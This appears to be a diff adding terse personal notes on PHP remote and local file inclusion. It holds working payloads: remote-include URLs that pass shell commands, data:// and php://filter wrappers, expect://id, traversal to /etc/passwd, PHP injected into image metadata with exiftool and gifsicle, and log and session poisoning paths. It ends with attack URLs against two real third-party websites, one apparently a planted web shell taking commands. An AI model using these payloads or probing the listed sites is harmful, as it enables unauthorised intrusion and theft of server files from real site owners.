@@ -1,0 +1,163 @@
+Remote File Inclusion RFI :
+
+include 
+include_once
+require
+require_once
+
+php.ini 
+allow_url_include  = off
+					 on
+					 
+
+$page = $_GET['page'];
+include($page);
+
+?page=01.php
+
+taregt :
+	1.txt
+		<?php phpinfo(); ?>
+	1.php
+	    
+?page=http://target.com/1.txt
+
+
+
+
+
+
+http://localhost/labs//rfi/01.php?page=http://127.0.0.1:3000/1.txt
+
+http://localhost/labs//rfi/01.php?page=http://127.0.0.1:3000/1.txt&c=ls -la
+
+
+http://localhost/labs//rfi/02.php?page=http://127.0.0.1:3000/2&c=ls -la
+
+http://localhost/labs//rfi/02.php?page=http://127.0.0.1:3000/1.txt%00&c=ls -la
+
+http://localhost/labs//rfi/02.php?page=http://127.0.0.1:3000/1.txt?&c=ls -la
+
+
+? 
+#
+
+include('http://ali.ir?.php')
+
+
+
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+
+
+
+
+Local File Inclusion : 
+	
+rfi -> http:// -> lfi
+
+ali%00.php -> 
+
+lfi -> not postfix prefix 
+https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
+
+
+
+
+
+
+
+
+php://filter/convert.base64-encode/resource=
+
+
+pHp://FilTer/convert.base64-encode/resource=
+
+zip://files.zip#shell.php
+
+
+zip://files.zip%23shell.php
+rar://
+expect://id
+
+../
+..\
+
+
+/opt/lampp/htdocs/labs/lfi/02.php 
+page/etc/passwd ../
+p1/p2/etc/passwd ../../
+
+/etc/passwd
+
+
+file://04.php
+../
+
+
+file:///etc/passwd
+
+
+Lfi :
+	jpg 
+	png
+	gif
+	
+	Lfi :
+		
+exiftool -imagedescription="<?php phpinfo(); ?>" logo1.jpg
+gifsicle --comment "<?php phpinfo(); ?>"  1.gif -o out.gif
+	
+	
+		
+		
+Access Log && Session Injection :
+
+fn : ali
+
+
+https://github.com/nixawk/fuzzdb/blob/master/attack/lfi/LFI-linux-httpd-log.txt
+
+
+/opt/lampp/temp/sess_944f47ffabf85c70962b9d946bb00bee
+
+
+
+
+
+
+
+/opt/lampp/logs/access_log
+
+
+
+
+
+File & Directory Traversal:
+opendir 
+fopen
+file_get_contents
+local file download => lfd
+
+
+opedir bug?
+		
+
+/../../../../../../etc/
+
+\..\..\..\..\..\..\etc/
+
+https://www.abcc.org.uk/js/tinymce/plugins/filemanager/dialog.php?type=1&editor=gal_description&lang=undefined&subfolder=cms-images
+%00
+
+
+/../06.php
+
+/../
+
+https://www.abcc.org.uk/documents/w.php?c=ls
+
+
+
+http://www.imoveisfrancatti.com.br/imoveisfrancatti/index.php?pagina=file:///etc/passwd
+
+http://www.imoveisfrancatti.com.br/imoveisfrancatti/index.php?pagina=file:///etc/nginx/nginx.conf
